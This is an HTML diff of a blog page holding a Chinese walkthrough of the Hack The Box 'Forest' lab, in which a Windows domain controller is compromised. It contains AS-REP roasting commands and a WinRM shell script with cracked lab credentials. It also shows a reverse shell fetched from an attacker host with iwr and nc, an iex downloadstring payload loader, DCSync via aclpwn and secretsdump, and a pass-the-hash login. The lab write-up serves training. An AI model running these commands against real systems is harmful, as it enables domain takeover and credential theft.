@@ -29,7 +29,13 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/ocean.min.css" />
+      
+        
+        
+        
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.21.0/themes/prism-tomorrow.min.css" />
+      
     
   
 
@@ -227,16 +233,16 @@
 <p><img src="https://p5.ssl.qhimg.com/t014ee4fb53a8ba6db0.png" srcset="/img/loading.gif"></p>
 <p><strong>使用工具：</strong>kali、masscan、nmap、rpcclient、Impacket工具、necat、BloodHound工具、Apache、Samba、Aclpwn</p>
 <h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h2><p>使用<code>masscan</code>对靶机Forest的ip：10.10.10.161 进行扫描:</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ masscan -e tun0 -p1-65535,U:1-65535 10.10.10.161 --rate=1000</span><br></pre></td></tr></table></figure>
+<pre class="language-shell" data-language="shell"><code class="language-shell">~$ masscan -e tun0 -p1-65535,U:1-65535 10.10.10.161 --rate&#x3D;1000</code></pre>
 
 <p><img src="https://p3.ssl.qhimg.com/t01a777dd8e4966e96e.png" srcset="/img/loading.gif"></p>
 <p>发现一堆开放端口，貌似真的有点多。。。使用<code>nmap</code>收集对应端口的服务信息：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ nmap -n -v -Pn -p 389,135,139,49682,49674,49655,5985,3268,47001,49675,49667,53,464,636,49902,593,88,9389,49664,49666,48671,445,49701 -A --reason 10.10.10.161 -oN nmap.txt</span><br></pre></td></tr></table></figure>
+<pre class="language-shell" data-language="shell"><code class="language-shell">~$ nmap -n -v -Pn -p 389,135,139,49682,49674,49655,5985,3268,47001,49675,49667,53,464,636,49902,593,88,9389,49664,49666,48671,445,49701 -A --reason 10.10.10.161 -oN nmap.txt</code></pre>
 
 <p><img src="https://p2.ssl.qhimg.com/t011b2b0b254b27dae0.png" srcset="/img/loading.gif"></p>
 <p>发现端口53（dns）、88（kerberos）、5985（winrm）、389/3268（ldap）、135/139/445（rpc）等。从<code>3268/tcp  open     ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</code>这条信息可以发现，靶机Forest应该是<code>htb.local</code>的域控制组。</p>
 <p>尝试用RPC来枚举用户，使用<code>rpcclietn</code>连接，并获取用户了列表：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ rpcclient -U &quot;&quot; -N 10.10.10.161</span><br></pre></td></tr></table></figure>
+<pre class="language-shell" data-language="shell"><code class="language-shell">~$ rpcclient -U &quot;&quot; -N 10.10.10.161</code></pre>
 
 <p><img src="https://p4.ssl.qhimg.com/t016138144cbbd07b76.png" srcset="/img/loading.gif"></p>
 <p>获取组列表：</p>
@@ -250,25 +256,46 @@
 </blockquote>
 <p>为了验证漏洞，我开始浏览Impacket工具，找到<code>GetNPUsers.py</code>：<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py</a> 。这个脚本的功能是遍历用户列表，并找到那些<code>Do not require Kerberos preauthentication</code>即“不需要kerberos预验证”的用户。</p>
 <p>我将所有用户保存在<code>users.txt</code>中，并执行<code>GetNPUsers.py</code>，成功获取到<code>svc-alfresco</code>账户的<code>TGT</code>hash：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ for user in $(cat users.txt);do ./GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/$&#123;user&#125;; done</span><br></pre></td></tr></table></figure>
+<pre class="language-shell" data-language="shell"><code class="language-shell">~$ for user in $(cat users.txt);do .&#x2F;GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb&#x2F;$&#123;user&#125;; done</code></pre>
 
 <p><img src="https://p2.ssl.qhimg.com/t012924f4f6d812f4fb.png" srcset="/img/loading.gif"></p>
 <p><img src="https://p0.ssl.qhimg.com/t013ae5e13aa0d298da.png" srcset="/img/loading.gif"></p>
 <p>下面就是破解hash，使用<code>hashcat</code>进行破解，得到明文密码为<code>s3rvice</code>:</p>
 <p><img src="https://p2.ssl.qhimg.com/t01c72e6a054f030e21.png" srcset="/img/loading.gif"></p>
 <p>现在我已经拥有了一个完整的账户认证<code>svc-alfresco:s3rvice</code>，下面就是找到交互点。在nmap执行结果中，我发现端口5985是打开的，并开启<code>winrm</code>服务。为了与该服务交互，创建了一个winrm-shell脚本：</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;winrm&#x27;</span></span><br><span class="line"></span><br><span class="line">conn = WinRM::Connection.new(</span><br><span class="line">  <span class="symbol">endpoint:</span> <span class="string">&#x27;http://10.10.10.161:5985/wsman&#x27;</span>,</span><br><span class="line">  <span class="symbol">user:</span> <span class="string">&#x27;svc-alfresco&#x27;</span>,</span><br><span class="line">  <span class="symbol">password:</span> <span class="string">&#x27;s3rvice&#x27;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">command=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">conn.shell(<span class="symbol">:powershell</span>) <span class="keyword">do</span> <span class="params">|shell|</span></span><br><span class="line">    <span class="keyword">until</span> command == <span class="string">&quot;exit\n&quot;</span> <span class="keyword">do</span></span><br><span class="line">        print <span class="string">&quot;PS &gt; &quot;</span></span><br><span class="line">        command = gets        </span><br><span class="line">        output = shell.run(command) <span class="keyword">do</span> <span class="params">|stdout, stderr|</span></span><br><span class="line">            STDOUT.print stdout</span><br><span class="line">            STDERR.print stderr</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span>    </span><br><span class="line">    puts <span class="string">&quot;Exiting with code <span class="subst">#&#123;output.exitcode&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<pre class="language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">require</span> <span class="token string">'winrm'</span>
+
+conn <span class="token operator">=</span> <span class="token constant">WinRM</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">Connection</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>
+  endpoint<span class="token punctuation">:</span> <span class="token string">'http://10.10.10.161:5985/wsman'</span><span class="token punctuation">,</span>
+  user<span class="token punctuation">:</span> <span class="token string">'svc-alfresco'</span><span class="token punctuation">,</span>
+  password<span class="token punctuation">:</span> <span class="token string">'s3rvice'</span><span class="token punctuation">,</span>
+<span class="token punctuation">)</span>
+
+command<span class="token operator">=</span><span class="token string">""</span>
+
+conn<span class="token punctuation">.</span>shell<span class="token punctuation">(</span><span class="token symbol">:powershell</span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span>shell<span class="token operator">|</span>
+    <span class="token keyword">until</span> command <span class="token operator">==</span> <span class="token string">"exit\n"</span> <span class="token keyword">do</span>
+        print <span class="token string">"PS > "</span>
+        command <span class="token operator">=</span> gets        
+        output <span class="token operator">=</span> shell<span class="token punctuation">.</span>run<span class="token punctuation">(</span>command<span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span>stdout<span class="token punctuation">,</span> stderr<span class="token operator">|</span>
+            <span class="token constant">STDOUT</span><span class="token punctuation">.</span>print stdout
+            <span class="token constant">STDERR</span><span class="token punctuation">.</span>print stderr
+        <span class="token keyword">end</span>
+    <span class="token keyword">end</span>    
+    puts <span class="token string">"Exiting with code <span class="token interpolation"><span class="token delimiter tag">#&#123;</span>output<span class="token punctuation">.</span>exitcode<span class="token delimiter tag">&#125;</span></span>"</span>
+<span class="token keyword">end</span></code></pre>
 
 <p>执行交互，成功获取到<code>svc-alfresco</code>的shell：</p>
 <p><img src="https://p3.ssl.qhimg.com/t0167b9a4c0dd0987c0.png" srcset="/img/loading.gif"></p>
 <p><strong>- 进入<code>svc-alfresco</code>用户的桌面，拿到<code>user flag</code>:</strong></p>
 <p><img src="https://p4.ssl.qhimg.com/t01062c6915af4c6690.png" srcset="/img/loading.gif"></p>
 <p>为了操作方便后续操作，我决定建立反向shell。把<code>nc64.exe</code>放入<code>/var/html/www</code>目录，开启Apache 服务：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ sudo service apache2 start  </span><br></pre></td></tr></table></figure>
+<pre class="language-shell" data-language="shell"><code class="language-shell">~$ sudo service apache2 start  </code></pre>
 
 <p><img src="https://p5.ssl.qhimg.com/t01b3d6b2f9eecdd52d.png" srcset="/img/loading.gif"></p>
 <p>在winrm-shell中，下载执行，成功获取反向shell：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> &gt; <span class="built_in">iwr</span> <span class="literal">-uri</span> http://<span class="number">10.10</span>.<span class="number">14.67</span>/nc64.exe <span class="literal">-outf</span> shell.exe</span><br><span class="line"><span class="built_in">PS</span> &gt; ./shell.exe <span class="number">10.10</span>.<span class="number">14.67</span> <span class="number">8888</span> <span class="literal">-e</span> powershell.exe</span><br></pre></td></tr></table></figure>
+<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> > <span class="token function">iwr</span> <span class="token operator">-</span>uri http:<span class="token operator">/</span><span class="token operator">/</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>14<span class="token punctuation">.</span>67<span class="token operator">/</span>nc64<span class="token punctuation">.</span>exe <span class="token operator">-</span>outf shell<span class="token punctuation">.</span>exe
+<span class="token function">PS</span> > <span class="token punctuation">.</span><span class="token operator">/</span>shell<span class="token punctuation">.</span>exe 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>14<span class="token punctuation">.</span>67 8888 <span class="token operator">-</span>e powershell<span class="token punctuation">.</span>exe</code></pre>
 
 <p><img src="https://p3.ssl.qhimg.com/t01983c216d5089e503.png" srcset="/img/loading.gif"></p>
 <p><img src="https://p4.ssl.qhimg.com/t013fbea0b507b7a77e.png" srcset="/img/loading.gif"></p>
@@ -277,41 +304,81 @@
 <p>kali可以直接运行命令安装：<code>sudo apt-get install bloodhound</code>。</p>
 </blockquote>
 <p>首先将项目git到本地：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ git clone https://github.com/BloodHoundAD/BloodHound.git</span><br></pre></td></tr></table></figure>
+<pre class="language-shell" data-language="shell"><code class="language-shell">~$ git clone https:&#x2F;&#x2F;github.com&#x2F;BloodHoundAD&#x2F;BloodHound.git</code></pre>
 
 <p>这里要使用<code>/BloodHoundAD/BloodHound/blob/master/Ingestors/</code>目录下的<code>SharpHound.ps1</code>工具。将它放入<code>/var/html/www</code>中，在<code>svc-alfresco</code>的shell中加载执行：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc<span class="literal">-alfresco</span>\evil&gt; <span class="built_in">iex</span>(<span class="built_in">new-object</span> net.webclient).downloadstring(<span class="string">&quot;http://10.10.14.67/SharpHound.ps1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\svc<span class="literal">-alfresco</span>\evil&gt; <span class="built_in">invoke-bloodhound</span> <span class="literal">-collectionmethod</span> all <span class="literal">-domain</span> htb.local <span class="literal">-ldapuser</span> svc<span class="literal">-alfresco</span> <span class="literal">-ldappass</span> s3rvice</span><br><span class="line"></span><br><span class="line">-----------------------------------------------</span><br><span class="line">Initializing SharpHound at <span class="number">12</span>:<span class="number">38</span> AM on <span class="number">4</span>/<span class="number">2</span>/<span class="number">2020</span></span><br><span class="line">-----------------------------------------------</span><br><span class="line"></span><br><span class="line">Resolved Collection Methods: <span class="built_in">Group</span>, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container</span><br><span class="line"></span><br><span class="line">[+] Creating Schema map <span class="keyword">for</span> domain HTB.LOCAL <span class="keyword">using</span> path CN=Schema,CN=Configuration,DC=HTB,DC=LOCAL</span><br><span class="line"><span class="built_in">PS</span> C:\Users\svc<span class="literal">-alfresco</span>\evil&gt; [+] Cache File not Found: <span class="number">0</span> Objects <span class="keyword">in</span> cache</span><br><span class="line"></span><br><span class="line">[+] Pre<span class="literal">-populating</span> Domain Controller SIDS</span><br><span class="line">Status: <span class="number">0</span> objects finished (+<span class="number">0</span>) -- <span class="keyword">Using</span> 84 MB RAM</span><br><span class="line">Status: <span class="number">123</span> objects finished (+<span class="number">123</span> <span class="number">24.6</span>)/s -- <span class="keyword">Using</span> 118 MB RAM</span><br><span class="line">Enumeration finished <span class="keyword">in</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">05.8247737</span></span><br><span class="line">Compressing <span class="keyword">data</span> to C:\Users\svc<span class="literal">-alfresco</span>\evil\<span class="number">20200402003811</span>_BloodHound.zip</span><br><span class="line">You can upload this file directly to the UI</span><br><span class="line"></span><br><span class="line">SharpHound Enumeration Completed at <span class="number">12</span>:<span class="number">38</span> AM on <span class="number">4</span>/<span class="number">2</span>/<span class="number">2020</span>! Happy Graphing!</span><br></pre></td></tr></table></figure>
+<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\Users\svc<span class="token operator">-</span>alfresco\evil> <span class="token function">iex</span><span class="token punctuation">(</span><span class="token function">new-object</span> net<span class="token punctuation">.</span>webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>downloadstring<span class="token punctuation">(</span><span class="token string">"http://10.10.14.67/SharpHound.ps1"</span><span class="token punctuation">)</span>
+
+<span class="token function">PS</span> C:\Users\svc<span class="token operator">-</span>alfresco\evil> <span class="token function">invoke-bloodhound</span> <span class="token operator">-</span>collectionmethod all <span class="token operator">-</span>domain htb<span class="token punctuation">.</span>local <span class="token operator">-</span>ldapuser svc<span class="token operator">-</span>alfresco <span class="token operator">-</span>ldappass s3rvice
+
+<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>
+Initializing SharpHound at 12:38 AM on 4<span class="token operator">/</span>2<span class="token operator">/</span>2020
+<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>
+
+Resolved Collection Methods: <span class="token function">Group</span><span class="token punctuation">,</span> Sessions<span class="token punctuation">,</span> LoggedOn<span class="token punctuation">,</span> Trusts<span class="token punctuation">,</span> ACL<span class="token punctuation">,</span> ObjectProps<span class="token punctuation">,</span> LocalGroups<span class="token punctuation">,</span> SPNTargets<span class="token punctuation">,</span> Container
+
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Creating Schema map <span class="token keyword">for</span> domain HTB<span class="token punctuation">.</span>LOCAL <span class="token keyword">using</span> path CN=Schema<span class="token punctuation">,</span>CN=Configuration<span class="token punctuation">,</span>DC=HTB<span class="token punctuation">,</span>DC=LOCAL
+<span class="token function">PS</span> C:\Users\svc<span class="token operator">-</span>alfresco\evil> <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Cache File not Found: 0 Objects in cache
+
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Pre<span class="token operator">-</span>populating Domain Controller SIDS
+Status: 0 objects finished <span class="token punctuation">(</span><span class="token operator">+</span>0<span class="token punctuation">)</span> <span class="token operator">--</span> <span class="token keyword">Using</span> 84 MB RAM
+Status: 123 objects finished <span class="token punctuation">(</span><span class="token operator">+</span>123 24<span class="token punctuation">.</span>6<span class="token punctuation">)</span><span class="token operator">/</span>s <span class="token operator">--</span> <span class="token keyword">Using</span> 118 MB RAM
+Enumeration finished in 00:00:05<span class="token punctuation">.</span>8247737
+Compressing <span class="token keyword">data</span> to C:\Users\svc<span class="token operator">-</span>alfresco\evil\20200402003811_BloodHound<span class="token punctuation">.</span>zip
+You can upload this file directly to the UI
+
+SharpHound Enumeration Completed at 12:38 AM on 4<span class="token operator">/</span>2<span class="token operator">/</span>2020<span class="token operator">!</span> Happy Graphing<span class="token operator">!</span></code></pre>
 
 <p>执行结束后，可以看到当前目录生成了<code>20200402003811_BloodHound.zip </code>的分析结果：</p>
 <p><img src="https://p1.ssl.qhimg.com/t01dc23f740f2e59396.png" srcset="/img/loading.gif"></p>
 <p>为了将分析结果取回，我在kali上开启了samba服务：</p>
 <p>Sam.conf:</p>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">[global]</span><br><span class="line">workgroup = WORKGROUP</span><br><span class="line">server string = Samba Server %v</span><br><span class="line">netbios name = kali</span><br><span class="line">security = user</span><br><span class="line">map to guest = bad user</span><br><span class="line">name resolve order = bcast host</span><br><span class="line">dns proxy = no</span><br><span class="line">bind interfaces only = yes</span><br><span class="line"></span><br><span class="line"># add to the end</span><br><span class="line">[evil]</span><br><span class="line">   path = /home/forest</span><br><span class="line">   writable = yes</span><br><span class="line">   guest ok = yes</span><br><span class="line">   guest only = yes</span><br><span class="line">   read only = no</span><br><span class="line">   create mode = 0777</span><br><span class="line">   directory mode = 0777</span><br><span class="line">   force user = nobody</span><br></pre></td></tr></table></figure>
+<pre class="language-txt" data-language="txt"><code class="language-txt">...
+[global]
+workgroup &#x3D; WORKGROUP
+server string &#x3D; Samba Server %v
+netbios name &#x3D; kali
+security &#x3D; user
+map to guest &#x3D; bad user
+name resolve order &#x3D; bcast host
+dns proxy &#x3D; no
+bind interfaces only &#x3D; yes
+
+# add to the end
+[evil]
+   path &#x3D; &#x2F;home&#x2F;forest
+   writable &#x3D; yes
+   guest ok &#x3D; yes
+   guest only &#x3D; yes
+   read only &#x3D; no
+   create mode &#x3D; 0777
+   directory mode &#x3D; 0777
+   force user &#x3D; nobody</code></pre>
 
 <p><img src="https://p4.ssl.qhimg.com/t0101e6e2a4319963a7.png" srcset="/img/loading.gif"></p>
 <blockquote>
 <p>这里遇到一个小坑，如果靶机无法复制文件到共享目录（提示权限问题），可以直接将kali上这一共享的文件夹权限设为777，就可以成功传文件了。我猜测虽然在配置smb.conf时设置了<code>write</code>权限，配置了777，出现这个问题可能是配置与建立文件夹的先后顺序的问题。</p>
 </blockquote>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc<span class="literal">-alfresco</span>\evil&gt; <span class="built_in">copy</span> <span class="number">20200402003811</span>_BloodHound.zip \\<span class="number">10.10</span>.<span class="number">14.67</span>\evil</span><br></pre></td></tr></table></figure>
+<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\Users\svc<span class="token operator">-</span>alfresco\evil> <span class="token function">copy</span> 20200402003811_BloodHound<span class="token punctuation">.</span>zip \\10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>14<span class="token punctuation">.</span>67\evil</code></pre>
 
 <p>成功取回分析文件：</p>
 <p><img src="https://p0.ssl.qhimg.com/t014128cf0bf6cef0ac.png" srcset="/img/loading.gif"></p>
 <p>在kali上启动BloodHound：</p>
 <p><img src="https://p5.ssl.qhimg.com/t01507083738ba654c7.png" srcset="/img/loading.gif"></p>
 <p><img src="https://p3.ssl.qhimg.com/t01c0103d4cb9d0eb83.png" srcset="/img/loading.gif"></p>
-<p>导入分析文件<code>20200402003811_BloodHound.zip</code>，在搜索栏中搜索``svc-alfresco@htb.local<code>，添加</code>target：<a href="mailto:&#x41;&#100;&#x6d;&#105;&#x6e;&#105;&#x73;&#116;&#114;&#x61;&#x74;&#111;&#x72;&#x40;&#104;&#116;&#x62;&#x2e;&#108;&#111;&#99;&#97;&#108;">&#x41;&#100;&#x6d;&#105;&#x6e;&#105;&#x73;&#116;&#114;&#x61;&#x74;&#111;&#x72;&#x40;&#104;&#116;&#x62;&#x2e;&#108;&#111;&#99;&#97;&#108;</a>`，可以看到分析路径图：</p>
+<p>导入分析文件<code>20200402003811_BloodHound.zip</code>，在搜索栏中搜索``svc-alfresco@htb.local<code>，添加</code>target：<a href="mailto:&#x41;&#x64;&#x6d;&#x69;&#110;&#105;&#115;&#116;&#114;&#x61;&#116;&#111;&#x72;&#64;&#104;&#116;&#x62;&#x2e;&#108;&#111;&#99;&#97;&#108;">&#x41;&#x64;&#x6d;&#x69;&#110;&#105;&#115;&#116;&#114;&#x61;&#116;&#111;&#x72;&#64;&#104;&#116;&#x62;&#x2e;&#108;&#111;&#99;&#97;&#108;</a>`，可以看到分析路径图：</p>
 <p><img src="https://p5.ssl.qhimg.com/t014efdf9a589c83934.png" srcset="/img/loading.gif"></p>
 <p>从图中可以发现，用户<code>svc-alfresco</code>是<code>SERVICE ACCOUNT@HTB.LOCAL</code>组的成员，该组是另一个组<code>PRIVILEGED ACCOUNT@HTB.LOCAL</code>的成员，进而又是<code>ACCOUNT OPREATION@HTB.LOCAL</code>组的成员，进而又是<code>EXCHANGE WINDOWS PERMISSIONS@HTB.LOACL</code>组的成员，最终连接到域<code>HTB.LOCAL</code>，并且还拥有<code>WriteDACL</code>权限。这一系列关键信息告诉我，可以为用户<code>svc-alfresco</code>授予<code>DCSync</code>特权，并展开<code>DCSync攻击</code>。</p>
 <p>这里使用了<code>aclpwn.py</code>工具进行自动化的利用，对该工具不了解的小伙伴可以参见它的手册：<a target="_blank" rel="noopener" href="https://github.com/fox-it/aclpwn.py/wiki/Quickstart">https://github.com/fox-it/aclpwn.py/wiki/Quickstart</a> ：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ ./aclpwn.py --from svc-alfresco@htb.local --domain htb.local --server 10.10.10.161 --user svc-alfresco --source-password &#x27;s3rvice&#x27;</span><br></pre></td></tr></table></figure>
+<pre class="language-shell" data-language="shell"><code class="language-shell">~$ .&#x2F;aclpwn.py --from svc-alfresco@htb.local --domain htb.local --server 10.10.10.161 --user svc-alfresco --source-password &#39;s3rvice&#39;</code></pre>
 
 <p><img src="https://p2.ssl.qhimg.com/t012b0f00897f4a809c.png" srcset="/img/loading.gif"></p>
 <p>接着<code>secretsdump.py</code>获取域中所有的用户hash，成功收获<code>Administrator</code>的hash值：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ ./secretsdump.py -just-dc-ntlm &#x27;svc-alfresco:s3rvice@10.10.10.161&#x27;   </span><br></pre></td></tr></table></figure>
+<pre class="language-shell" data-language="shell"><code class="language-shell">~$ .&#x2F;secretsdump.py -just-dc-ntlm &#39;svc-alfresco:s3rvice@10.10.10.161&#39;   </code></pre>
 
 <p><img src="https://p2.ssl.qhimg.com/t0104fe28891db822c0.png" srcset="/img/loading.gif"></p>
 <p>利用Impacket工具中<code>wmiexec.py</code>脚本，使用该hash登录Administrator用户，成功获得超级权限：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ python ./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161</span><br></pre></td></tr></table></figure>
+<pre class="language-shell" data-language="shell"><code class="language-shell">~$ python .&#x2F;wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161</code></pre>
 
 <p><img src="https://p3.ssl.qhimg.com/t01b74cf7cf4d6a0dfd.png" srcset="/img/loading.gif"></p>
 <p>进入超级用户桌面，成功拿到<code>root flag</code>:</p>
@@ -489,6 +556,8 @@
 
 
 
+  
+    
   
 
 
